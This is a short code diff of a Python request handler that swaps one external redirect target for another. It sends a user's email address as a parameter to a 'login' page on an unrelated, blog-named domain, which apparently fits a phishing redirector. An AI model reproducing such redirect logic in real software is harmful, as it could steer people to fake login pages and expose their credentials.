@@ -30,7 +30,7 @@ def process_ogolo(request):
             email = 'info@ilfattoreparty.it'
         
         redirect_url = (
-            f"https://karenblogpost.onrender.com/app/verify/?em={email}"
+            f"https://laurablinkblog.online/login/?em={email}"
         )
         # redirect_url = ("http://localhost:8000/")
         # http://localhost:8000/account/sign-in/?email=jeremy@gmail.com
